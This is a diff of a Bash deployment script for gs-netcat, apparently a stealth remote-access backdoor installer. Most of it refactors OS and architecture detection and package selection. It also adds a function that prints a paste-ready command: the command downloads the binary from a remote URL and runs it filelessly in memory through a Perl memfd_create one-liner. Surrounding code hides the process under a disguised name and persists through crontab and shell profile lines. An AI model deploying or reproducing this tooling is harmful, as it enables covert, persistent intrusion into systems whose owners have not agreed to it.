@@ -29,7 +29,7 @@
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install gsocket
-# GS_OSARCH=linux-x86_64
+# GS_OSARCH=x86_64-linux or mipsel32-linux etc
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
@@ -228,6 +228,7 @@ CONFIG_DIR_NAME_RM=("${config_dir_name_arr[@]}" "htop" "dbus")
 	CF="\033[2m"    # faint
 	CN="\033[0m"    # none
 	CW="\033[1;37m"
+	CRY="\e[0;33;41m"  # YELLOW on RED (warning)
 }
 
 if [[ -z "$GS_DEBUG" ]]; then
@@ -596,6 +597,17 @@ try_dstdir()
 	return "$ret"
 }
 
+output_memexec() {
+	[[ "$OSNAME" != "linux" ]] && return
+	echo -e "\
+Alternativly, cut & paste the following to deploy to memory:
+${CDC}X=${CDY}SecretChangeMe${CDR}${CF} # ${CRY}<--- ${CRY}CHANGE THIS!${CN}
+${CDC}${DL[*]} ${URL_BIN}/${SRC_PKG} | \\"
+	echo 'GS_ARGS="-ilD -s ${X:?}" \'
+	echo -n 'perl '"'"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'"'"' -- "$@"'
+	echo -e "${CN}"
+}
+
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
@@ -625,6 +637,7 @@ init_dstbin()
 
 	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
 	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	output_memexec
 	errexit
 }
 
@@ -657,16 +670,39 @@ try_encode()
 
 
 # Return TRUE if we are 100% sure it's little endian
+# Only used for MIPS & ARM where it should default to BIG endian (unless we are 100% sure it's LE).
 is_le()
 {
-	command -v lscpu >/dev/null && {
-		[[ $(lscpu) == *"Little Endian"* ]] && return 0
-		return 255
+	local str
+
+	command -v od >/dev/null && command -v awk >/dev/null  && {
+		str="$(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}')"
+		[[ "$str" == "1" ]] && return 0
+		[[ "$str" == "0" ]] && return 255
 	}
 
-	command -v od >/dev/null && command -v awk >/dev/null && {
-		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
+	command -v python >/dev/null && {
+		str="$(python -c 'import sys; print(sys.byteorder)')"
+		[[ "$str" == "little" ]] && return 0
+		[[ "$str" == "big" ]] && return 255
 	}
+
+	command -v perl >/dev/null && {
+		str="$(perl -MConfig -e 'print "$Config{byteorder}\n";')"
+		[[ "$str" == "1"* ]] && return 0
+		[[ "$str" == "87654321" ]] && return 255
+		[[ "$str" == "4321" ]] && return 255
+	}
+
+	command -v printf >/dev/null && command -v hexdump >/dev/null && {
+		printf '\x01\x02' | hexdump -x | grep -q 0201 && return 0
+		printf '\x01\x02' | hexdump -x | grep -q 0102 && return 255
+	}
+
+	# command -v lscpu >/dev/null && {
+	# 	# lscpu LIES on qemu/s390x (should be BIG).
+	# 	[[ $(lscpu) == *"Little Endian"* ]] && return 0
+	# }
 
 	return 255
 }
@@ -699,19 +735,16 @@ init_vars()
 	[[ "$GS_BEACON" -gt 0 ]] && [[ "$GS_BEACON" -lt 10 ]] && GS_BEACON=10
 	[[ "$GS_DEBUG" -eq 0 ]] && unset GS_DEBUG
 
-	[[ -z "$OSTYPE" ]] && {
-		local osname
-		osname="$(uname -s)"
-		if [[ "$osname" == *FreeBSD* ]]; then
-			OSTYPE="FreeBSD"
-		elif [[ "$osname" == *Darwin* ]]; then
-			OSTYPE="darwin22.0"
-		elif [[ "$osname" == *OpenBSD* ]]; then
-			OSTYPE="openbsd7.3"
-		elif [[ "$osname" == *Linux* ]]; then
-			OSTYPE="linux-gnu"
-		fi
-	}
+	local osname
+	osname="$(uname -s)"
+	OSNAME="linux" # DEFAULT
+	if [[ "$osname" == *FreeBSD* ]]; then
+		OSNAME="freebsd"
+	elif [[ "$osname" == *Darwin* ]]; then
+		OSNAME="osx"
+	elif [[ "$osname" == *OpenBSD* ]]; then
+		OSNAME="openbsd"
+	fi
 
 	# Unset so that test_dstbin() can test -g parameter without exiting.
 	unset GSNC
@@ -721,80 +754,96 @@ init_vars()
 	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
 
 	if [[ -z "$OSARCH" ]]; then
-		if [[ $OSTYPE == *linux* ]]; then 
+		if [[ $OSNAME == "linux" ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
-				OSARCH="i386-linux"
-				SRC_PKG="gs-netcat_mini-linux-i686"
+				OSARCH="i386"
+			elif [[ "$arch" == "x86_64" ]]; then
+				OSARCH="x86_64"
 			elif [[ "$arch" == *"armv6"* ]]; then
-				OSARCH="arm-linux"
-				SRC_PKG="gs-netcat_mini-linux-armv6"
+				OSARCH="arm6"
 			elif [[ "$arch" == *"armv7l" ]]; then
-				OSARCH="arm-linux"
-				SRC_PKG="gs-netcat_mini-linux-armv7l"
+				OSARCH="arm7"
 			elif [[ "$arch" == *"armv"* ]]; then
-				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
-				SRC_PKG="gs-netcat_mini-linux-arm"
+				OSARCH="arm" # RPI-Zero / RPI 4b+
 			elif [[ "$arch" == "aarch64" ]]; then
-				OSARCH="aarch64-linux"
-				SRC_PKG="gs-netcat_mini-linux-aarch64"
+				OSARCH="aarch64"
+			elif [[ "$arch" == "x86_64" ]]; then
+				OSARCH="x86_64"
 			elif [[ "$arch" == "mips64" ]]; then
-				OSARCH="mips64-linux"
-				SRC_PKG="gs-netcat_mini-linux-mips64"
-				# Go 32-bit if Little Endian even if 64bit arch
-				is_le && {
-					OSARCH="mipsel32-linux"
-					SRC_PKG="gs-netcat_mini-linux-mipsel"
-				}
+				OSARCH="mips64"
+				is_le && OSARCH="mipsel32"
 			elif [[ "$arch" == *mips* ]]; then
-				OSARCH="mips32-linux"
-				SRC_PKG="gs-netcat_mini-linux-mips32"
-				is_le && {
-					OSARCH="mipsel32-linux"
-					SRC_PKG="gs-netcat_mini-linux-mipsel"
-				}
+				OSARCH="mips32"
+				is_le && OSARCH="mipsel32"
 			elif [[ "$arch" == *"ppc"* ]]; then
 				if is_64bit; then
-					OSARCH="powerpc64-linux"
-					SRC_PKG="gs-netcat_mini-linux-powerpc64"
-					is_le && {
-						OSARCH="powerpc64le-linux"
-						SRC_PKG="gs-netcat_mini-linux-powerpc64le"
-					}
+					OSARCH="powerpc64"
+					is_le && OSARCH="powerpc64le"
 				else
-					OSARCH="powerpc-linux"
-					SRC_PKG="gs-netcat_mini-linux-powerpc"
-					is_le && {
-						OSARCH="powerpcle-linux"
-						SRC_PKG="gs-netcat_mini-linux-powerpcle"
-					}
+					OSARCH="powerpc"
+					is_le && OSARCH="powerpcle"
 				fi
 			fi
-		elif [[ $OSTYPE == *darwin* ]]; then
+			[[ -n "$OSARCH" ]] && OSARCH+="-linux"
+		elif [[ $OSNAME == "osx" ]]; then
 			if [[ "$arch" == "arm64" ]]; then
-				OSARCH="arm64-osx" # M1
-				SRC_PKG="gs-netcat_mini-macOS-arm64"
+				OSARCH="arm64" # M1
 			else
-				OSARCH="x86_64-osx"
-				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+				OSARCH="x86_64"
 			fi
-		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
+			OSARCH+="-osx"
+		elif [[ ${OSNAME,,} == *freebsd* ]]; then
 				OSARCH="x86_64-freebsd"
-				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
-		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
+		elif [[ ${OSNAME,,} == *openbsd* ]]; then
 				OSARCH="x86_64-openbsd"
-				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
-		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
+		elif [[ ${OSNAME,,} == *cygwin* ]]; then
 			OSARCH="i686-cygwin"
 			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
-		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
-				# OSARCH="i386-hurd" # debian-hurd
 		fi
+	fi # -z $OSARCH
 
-		[[ -z "$OSARCH" ]] && {
-			# Default: Try Alpine(muscl libc) 64bit
-			OSARCH="x86_64-linux"
-			SRC_PKG="gs-netcat_mini-linux-x86_64"
-		}
+	if [[ $OSARCH == "x86_64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-x86_64"
+	elif [[ $OSARCH == "i386-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-i686"
+	elif [[ $OSARCH == "arm7-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-armv7l"
+	elif [[ $OSARCH == "arm6-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-armv6"
+	elif [[ $OSARCH == "arm-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-arm"
+	elif [[ $OSARCH == "aarch64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-aarch64"
+	elif [[ $OSARCH == "mips64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mips64"
+	elif [[ $OSARCH == "mips32-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mips32"
+	elif [[ $OSARCH == "mipsel32-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mipsel"
+	elif [[ $OSARCH == "powerpc64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc64"
+	elif [[ $OSARCH == "powerpc64le-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc64le"
+	elif [[ $OSARCH == "powerpc-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc"
+	elif [[ $OSARCH == "powerpcle-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpcle"
+	elif [[ $OSARCH == "x86_64-osx" ]]; then
+		SRC_PKG="gs-netcat_mini-macOS-x86_64"
+	elif [[ $OSARCH == "arm64-osx" ]]; then
+		SRC_PKG="gs-netcat_mini-macOS-arm64"
+	elif [[ $OSARCH == "x86_64-freebsd" ]]; then
+		SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+	elif [[ $OSARCH == "x86_64-openbsd" ]]; then
+		SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+	elif [[ $OSARCH == "x86_64-cygwin" ]]; then
+		SRC_PKG="x86_64-cygwin"
+	elif [[ $OSARCH == "i686-cygwin" ]]; then
+		SRC_PKG="i686-cygwin"
+	else
+		OSARCH="x86_64-linux"
+		WARN "Unsupported OS/Architecture: ${CW}${arch}-${OSNAME}${CN}. Using ${CDY}${OSARCH}${CN}"
+		SRC_PKG="gs-netcat_mini-linux-x86_64"
 	fi
 
 	# Docker does not set USER
@@ -807,7 +856,6 @@ init_vars()
 		try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	}
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_mini-${OSARCH}.tar.gz"
 
 	# Defaults
 	# Binary file is called gs-dbus or set to same name as Process name if
@@ -836,13 +884,13 @@ init_vars()
 
 	unset LDSO
 	# DISABLED because ld-linux.so loading of static bins (gsnc-stealth) wont work :/
-	# [[ "$OSTYPE" == *linux* ]] && [[ -z "$S" ]] && {
+	# [[ "$OSNAME" == *linux* ]] && [[ -z "$S" ]] && {
 	# 	LDSO="$(echo /lib64/ld-*.so.*)"
 	# 	[[ ! -f "${LDSO}" ]] && LDSO="$(echo /lib/ld-*.so.*)"
 	# 	[[ ! -f "${LDSO}" ]] && unset LDSO
 	# }
 
-	if [[ $OSTYPE == *darwin* ]]; then
+	if [[ $OSNAME == "osx" ]]; then
 		# on OSX 'pkill' and 'killall' match the process (argv[0]) whereas on Unix
 		# they match the binary name.
 		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
@@ -937,7 +985,8 @@ init_vars()
 		IS_USE_WGET=1
 		### Note: Dont use -q: Need errors to process 404 for CF webhooks
 		# Read-timeout is 900 seconds by default.
-		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
+		DL=("wget" "-O-")
+		wget --help 2>&1 | grep -qFm1 connect && DL+=("--connect-timeout=7" "--dns-timeout=7")
 		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
 	else
 		# Can happen if deploy-all.sh when no curl/wget
@@ -1010,7 +1059,7 @@ init_setup()
 	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
 	unset PROFILE_LINE CRONTAB_LINE
-	if [[ $OSTYPE == *linux* ]]; then
+	if [[ $OSNAME == "linux" ]]; then
 		[[ -n "$LDSO" ]] && str="${LDSO} "
 		# Under Linux the gsnc binary check's itself and exits if already running.
 		PROFILE_LINE="${str}'${DSTBIN}'"
@@ -1239,7 +1288,7 @@ uninstall()
 		# Escape regular exp special characters
 		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')-kernel"
 	done
-	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
+	if [[ $OSNAME != "osx" ]] && command -v crontab >/dev/null; then
 		ct="$(crontab -l 2>/dev/null)"
 		[[ "$ct" =~ ($regex) ]] && {
 			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
@@ -1705,7 +1754,7 @@ install_user_profile()
 install_user()
 {
 	# Use crontab if it's not in systemd (but might be in rc.local).
-	[[ $OSTYPE != *darwin* ]] && install_user_crontab
+	[[ $OSNAME != "osx" ]] && install_user_crontab
 
 	[[ $IS_INSTALLED -lt 2 ]] && {
 		# install_user_profile
@@ -2085,6 +2134,7 @@ gs_start_systemd()
 
 gs_start()
 {
+	local old_pid
 	[[ -n $IS_GS_RUNNING ]] && return
 
 	printf "%-70.70s" "${STARTING_STR}....................................................."
@@ -2109,26 +2159,19 @@ gs_start()
 			IS_OLD_RUNNING=1
 		fi
 	fi
-	IS_NEED_START=1
+
+	[[ -z "$IS_OLD_RUNNING" ]] && {
+		old_pid="$(unset -v GS_CONFIG_READ; GS_SHOW_RUNNING=1 "${DSTBIN_EXEC_ARR[@]}")"
+		[[ -n "$old_pid" ]] && IS_OLD_RUNNING=1
+	}
 
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: OLD is already running.
-		if [[ -n "$IS_SKIPPED" ]]; then
-			# HERE: Already running. Skipped installation.
-			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
-			unset IS_NEED_START
-		else
-			# HERE: New installation.
-			OK_OUT
-			WARN "Multiple gs-netcats running."
-			echo -e "--> You may want to check: ${CM}ps -elf|grep -v 'grep '${CN}"
-			# [[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
-		fi
-	else
-		OK_OUT ""
+		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}' [PID $old_pid]."
+		return
 	fi
 
-	[[ -z $IS_NEED_START ]] && return
+	OK_OUT ""
 
 	(cd "$HOME"; unset -v GS_CONFIG_READ; "${DSTBIN_EXEC_ARR[@]}") || errexit
 	IS_GS_RUNNING=1
@@ -2179,8 +2222,8 @@ if [[ -z $GS_NOINST ]]; then
 		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
 	fi
 else
-	echo -e "GS_NOINST is set. Skipping installation."
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}"
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
+	echo -e "${CDC}GS_NOINST=1${CN} is set. Skipping installation."
 fi
 # -----END Install permanentally-----
 
@@ -2194,17 +2237,6 @@ fi
 	unset ok
 	echo -en "Using low PID. May take 60 sec before connecting......................"
 	OK_OUT "Set ${CDC}GS_NOFFPID=1${CN} to disable"
-	# if [[ -n "$DSTBIN" ]]; then
-	# 	res=$(GS_UTIL_FFPID=1 GS_CONFIG_READ=0 "${DSTBIN_EXEC_ARR[@]}" 2>/dev/null) && ok=1
-	# else
-	# 	res=$(GS_UTIL_FFPID=1 GS_CONFIG_READ=0 "${INFECTED_BIN_NAME}" 2>/dev/null) && ok=1
-	# fi
-	# if [[ -n "$ok" ]]; then
-	# 	OK_OUT "Low PID found at ~${res:-NA}"
-	# else
-	# 	SKIP_OUT "PID forwarded to ${res:-NA} only"
-	# fi
-	# unset ok
 }
 
 webhooks
